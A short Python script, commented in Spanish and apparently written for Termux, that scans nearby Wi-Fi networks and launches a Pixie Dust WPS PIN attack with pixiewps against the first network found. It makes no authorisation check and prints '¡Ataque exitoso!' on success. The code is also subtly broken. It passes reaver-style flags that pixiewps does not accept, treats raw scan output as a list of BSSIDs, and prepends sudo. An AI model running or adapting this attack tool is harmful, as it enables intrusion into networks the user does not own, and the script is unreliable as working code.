import subprocess
import json
import os
import shutil

def run_command(command, use_sudo=False):
    """Ejecuta un comando en la terminal y devuelve la salida."""
    import subprocess
    if use_sudo:
        command = "sudo " + command
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode(), result.stderr.decode()

def scan_wifi():
    """Escanea las redes Wi-Fi disponibles y devuelve una lista de redes."""
    scan_command = "termux-wifi-scaninfo"
    scan_stdout, scan_stderr = run_command(scan_command)
    if scan_stderr:
        print(f"Error al escanear redes Wi-Fi: {scan_stderr}")
        return []
    # Aquí se debería parsear la salida de scan_stdout para obtener las redes
    # Por simplicidad, asumimos que devuelve una lista de BSSIDs
    return scan_stdout.splitlines()

# Ejecutar pixiewps directamente
def execute_pixiewps(bssid):
    pixiewps_command = f"pixiewps -i wlan0 -b {bssid} -vv"
    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=True)

    if "WPS pin:" in pixie_stdout:
        pin = extract_value(pixie_stdout, "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def extract_value(output, key):
    """Extrae un valor específico de la salida basada en una clave."""
    for line in output.splitlines():
        if key in line:
            return line.split(key)[-1].strip()
    return None

def check_prerequisites():
    """Verifica que las herramientas necesarias estén instaladas."""
    tools = ["termux-wifi-scaninfo", "pixiewps"]
    for tool in tools:
        if not shutil.which(tool):
            print(f"Error: {tool} no está instalado. Por favor, instálalo e intenta nuevamente.")
            return False
    return True

def main():
    # Verificar herramientas necesarias
    if not check_prerequisites():
        return

    # Escanear redes Wi-Fi
    networks = scan_wifi()
    if not networks:
        print("No se encontraron redes Wi-Fi.\n")
        return

    # Mostrar redes disponibles
    print("\nRedes Wi-Fi detectadas:")
    for network in networks:
        print(network)

    # Aquí se debería seleccionar una red y ejecutar pixiewps
    # Por simplicidad, asumimos que seleccionamos la primera red
    if networks:
        bssid = networks[0]
        execute_pixiewps(bssid)

if __name__ == "__main__":
    main()






